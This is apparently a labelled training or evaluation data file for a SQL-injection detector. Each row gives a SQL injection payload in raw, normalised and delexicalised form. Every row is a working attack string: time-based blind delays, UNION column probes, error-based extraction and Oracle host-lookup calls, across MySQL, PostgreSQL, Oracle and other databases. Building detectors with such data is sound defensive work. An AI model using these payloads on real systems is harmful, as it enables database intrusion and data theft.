payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
"1""  )   where 1144  =  1144 and 2006  =  2006",1,sqli_dataset.csv,,False,"1"" ) where 1144 = 1144 and 2006 = 2006","<NUM>"" ) where <NUM> = <NUM> and <NUM> = <NUM>"
1%'  )   rlike sleep  (  5  )   and   (  '%'  =  ',1,sqli_dataset.csv,,False,1%' ) rlike sleep ( 5 ) and ( '%' = ',<NUM>%<STR>%<STR>
"1  )   where 7748  =  7748 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sqli_dataset.csv,,False,"1 ) where 7748 = 7748 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM> ) where <NUM> = <NUM> and <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#",1,sqli_dataset.csv,,False,"-9171 ) union all select 6880,6880,6880,6880,6880,6880,6880#","-<NUM> ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
-1772' or 7911  =  4985#,1,sqli_dataset.csv,,False,-1772' or 7911 = 4985#,-<NUM>' or <NUM> = <NUM>#
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'zjxk'  =  'zjxk",1,sqli_dataset.csv,,False,"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'zjxk' = 'zjxk",<NUM><STR>zjxk<STR>zjxk
"1'  )   where 9091  =  9091 union all select null,null,null,null#",1,sqli_dataset.csv,,False,"1' ) where 9091 = 9091 union all select null,null,null,null#","<NUM>' ) where <NUM> = <NUM> union all select null,null,null,null#"
1' and   (  1088  =  7530  )  *7530 and 'xkfu'  =  'xkfu,1,sqli_dataset.csv,,False,1' and ( 1088 = 7530 ) *7530 and 'xkfu' = 'xkfu,<NUM><STR>xkfu<STR>xkfu
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cssb'  =  'cssb",1,sqli_dataset.csv,,False,"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'cssb' = 'cssb",<NUM><STR>abcdefg<STR>cssb<STR>cssb
"1' and make_set  (  4952  =  7129,7129  )  ",1,sqli_dataset.csv,,False,"1' and make_set ( 4952 = 7129,7129 )","<NUM>' and make_set ( <NUM> = <NUM>,<NUM> )"
1  )   and 3861  =  5813--,1,sqli_dataset.csv,,False,1 ) and 3861 = 5813--,<NUM> ) and <NUM> = <NUM>--
1  )   as afxc where 7497  =  7497,1,sqli_dataset.csv,,False,1 ) as afxc where 7497 = 7497,<NUM> ) as afxc where <NUM> = <NUM>
1' where 8537  =  8537 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sqli_dataset.csv,,False,1' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,<NUM>' where <NUM> = <NUM> and <NUM> = ( select upper ( xmltype ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) from dual ) --
-1711  )   where 9098  =  9098 order by 1#,1,sqli_dataset.csv,,False,-1711 ) where 9098 = 9098 order by 1#,-<NUM> ) where <NUM> = <NUM> order by <NUM>#
1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,1,sqli_dataset.csv,,False,1' in boolean mode ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) #,<NUM>' in boolean mode ) or <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) #
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1,sqli_dataset.csv,,False,1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),<NUM> or ( select * from ( select ( sleep ( <NUM> ) ) ) ydpu )
1'  )   where 2928  =  2928 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,sqli_dataset.csv,,False,1' ) where 2928 = 2928 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,<NUM>' ) where <NUM> = <NUM> and ( select * from ( select ( sleep ( <NUM> ) ) ) gcrr ) #
"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,sqli_dataset.csv,,False,"1 ) as cnpv where 4902 = 4902 and elt ( 1210 = 1210,sleep ( 5 ) ) --","<NUM> ) as cnpv where <NUM> = <NUM> and elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) --"
"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",1,sqli_dataset.csv,,True,"-2582'+ ( select ggim where 5346 = 5346 union all select 5346,5346#","-<NUM>'+ ( select ggim where <NUM> = <NUM> union all select <NUM>,<NUM>#"
"1   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sqli_dataset.csv,,False,"1 ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM> ) ) and <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --"
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'crkz'  =  'crkz",1,sqli_dataset.csv,,False,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 'crkz' = 'crkz","select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( <STR> = 'crkz"
"1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sqli_dataset.csv,,False,"1' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --","<NUM>' ) ) or <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --"
"-6381%"" or 8571  =  8571--",1,sqli_dataset.csv,,False,"-6381%"" or 8571 = 8571--","-<NUM>%"" or <NUM> = <NUM>--"
1'  )   as jlae where 1650  =  1650,1,sqli_dataset.csv,,False,1' ) as jlae where 1650 = 1650,<NUM>' ) as jlae where <NUM> = <NUM>
"1' where 2774  =  2774 union all select null,null,null,null,null#",1,sqli_dataset.csv,,False,"1' where 2774 = 2774 union all select null,null,null,null,null#","<NUM>' where <NUM> = <NUM> union all select null,null,null,null,null#"
"1%""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>
1 where 7038  =  7038,1,sqli_dataset.csv,,False,1 where 7038 = 7038,<NUM> where <NUM> = <NUM>
1'+  (  select basp where 6953  =  6953,1,sqli_dataset.csv,,True,1'+ ( select basp where 6953 = 6953,<NUM>'+ ( select basp where <NUM> = <NUM>
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'eqle'  =  'eqle",1,sqli_dataset.csv,,False,"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'eqle' = 'eqle",<NUM><STR>eqle<STR>eqle
-8486%'   )    )     )   or 8571  =  8571--,1,sqli_dataset.csv,,False,-8486%' ) ) ) or 8571 = 8571--,-<NUM>%' ) ) ) or <NUM> = <NUM>--
"-3393""   )    )    union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",1,sqli_dataset.csv,,False,"-3393"" ) ) union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--","-<NUM>"" ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"-6642'  )   where 3459  =  3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#",1,sqli_dataset.csv,,False,"-6642' ) where 3459 = 3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#","-<NUM>' ) where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1 ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM> ) ) ) and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
"-4300""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""klbu""  =  ""klbu",1,sqli_dataset.csv,,False,"-4300"" ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""klbu"" = ""klbu",-<NUM><STR>klbu<STR>klbu
"-3505""  )   where 2340  =  2340 or 9323  =  9323#",1,sqli_dataset.csv,,False,"-3505"" ) where 2340 = 2340 or 9323 = 9323#","-<NUM>"" ) where <NUM> = <NUM> or <NUM> = <NUM>#"
-1714' union all select 6687--,1,sqli_dataset.csv,,False,-1714' union all select 6687--,-<NUM>' union all select <NUM>--
"1%""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""%"" = """,<NUM>%<STR>%<STR>
"1%"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""%"" = """,<NUM>%<STR>%<STR>
"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",1,sqli_dataset.csv,,False,"1%' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( '%' = '",<NUM>%<STR>%<STR>
"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",1,sqli_dataset.csv,,False,"-5424' ) ) union all select 8231,8231,8231,8231,8231,8231,8231,8231#","-<NUM>' ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --",1,sqli_dataset.csv,,False,"1' ) ) as qhpv where 7049 = 7049 and make_set ( 8403 = 8403,8899 ) --","<NUM>' ) ) as qhpv where <NUM> = <NUM> and make_set ( <NUM> = <NUM>,<NUM> ) --"
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,sqli_dataset.csv,,True,"1 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )","<NUM> and ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) )"
"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,sqli_dataset.csv,,False,"1%"" or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --","<NUM>%"" or <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --"
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1,sqli_dataset.csv,,True,"1 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )","<NUM> or row ( <NUM>,<NUM> ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from ( select <NUM> union select <NUM> union select <NUM> union select <NUM> ) a group by x )"
1'  )   where 2808  =  2808,1,sqli_dataset.csv,,False,1' ) where 2808 = 2808,<NUM>' ) where <NUM> = <NUM>
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'hxcq'  =  'hxcq",1,sqli_dataset.csv,,False,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'hxcq' = 'hxcq","select count ( * ) from generate_series ( <NUM>,<NUM> ) and ( ( <STR> = 'hxcq"
1   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   9452  =  9452,1,sqli_dataset.csv,,False,1 ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 9452 = 9452,<NUM> ) ) and <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) and ( ( <NUM> = <NUM>
"1""  )   and sleep  (  5  )  #",1,sqli_dataset.csv,,False,"1"" ) and sleep ( 5 ) #","<NUM>"" ) and sleep ( <NUM> ) #"
"1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1 where 5382 = 5382 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --","<NUM> where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --"
"1'  )   as bvvl where 9818  =  9818 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,sqli_dataset.csv,,True,"1' ) as bvvl where 9818 = 9818 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --","<NUM>' ) as bvvl where <NUM> = <NUM> and ( select <NUM> from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from information_schema.character_sets group by x ) a ) --"
1'+  (  select 'wsjk' where 3291  =  3291,1,sqli_dataset.csv,,True,1'+ ( select 'wsjk' where 3291 = 3291,<NUM><STR>wsjk' where <NUM> = <NUM>
-3750'+  (  select alpu where 3911  =  3911 order by 1--,1,sqli_dataset.csv,,True,-3750'+ ( select alpu where 3911 = 3911 order by 1--,-<NUM>'+ ( select alpu where <NUM> = <NUM> order by <NUM>--
"1""  )   as wehx where 5744  =  5744",1,sqli_dataset.csv,,False,"1"" ) as wehx where 5744 = 5744","<NUM>"" ) as wehx where <NUM> = <NUM>"
"-8580'  )   union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",1,sqli_dataset.csv,,False,"-8580' ) union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#","-<NUM>' ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"-6118 union all select 5906,5906,5906,5906,5906#",1,sqli_dataset.csv,,False,"-6118 union all select 5906,5906,5906,5906,5906#","-<NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1'+  (  select 'wkcq' where 1020  =  1020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sqli_dataset.csv,,True,"1'+ ( select 'wkcq' where 1020 = 1020 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","<NUM><STR>wkcq' where <NUM> = <NUM> and <NUM> = benchmark ( <NUM>,md5 ( 0x6d457153 ) ) #"
"-2106"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""dvlq"" like ""dvlq",1,sqli_dataset.csv,,False,"-2106"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""dvlq"" like ""dvlq",-<NUM><STR>dvlq<STR>dvlq
"-1152%'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  '%'  =  '",1,sqli_dataset.csv,,False,"-1152%' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( '%' = '",-<NUM>%<STR>%<STR>
"-4707' union all select 4414,4414,4414,4414,4414,4414#",1,sqli_dataset.csv,,False,"-4707' union all select 4414,4414,4414,4414,4414,4414#","-<NUM>' union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1""   )    )     )   union all select null,null,null--",1,sqli_dataset.csv,,False,"1"" ) ) ) union all select null,null,null--","<NUM>"" ) ) ) union all select null,null,null--"
"1%'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sqli_dataset.csv,,False,"1%' ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM>%' ) ) or <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
"1"" where 8635  =  8635 and 4595  =  4595#",1,sqli_dataset.csv,,False,"1"" where 8635 = 8635 and 4595 = 4595#","<NUM>"" where <NUM> = <NUM> and <NUM> = <NUM>#"
1  )   rlike sleep  (  5  ) ,1,sqli_dataset.csv,,False,1 ) rlike sleep ( 5 ),<NUM> ) rlike sleep ( <NUM> )
"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sqli_dataset.csv,,True,"1 where 7522 = 7522 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --","<NUM> where <NUM> = <NUM> and ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) ) --"
1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,sqli_dataset.csv,,False,1%' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,<NUM>%' ) ) and ( select * from ( select ( sleep ( <NUM> ) ) ) gcrr ) #
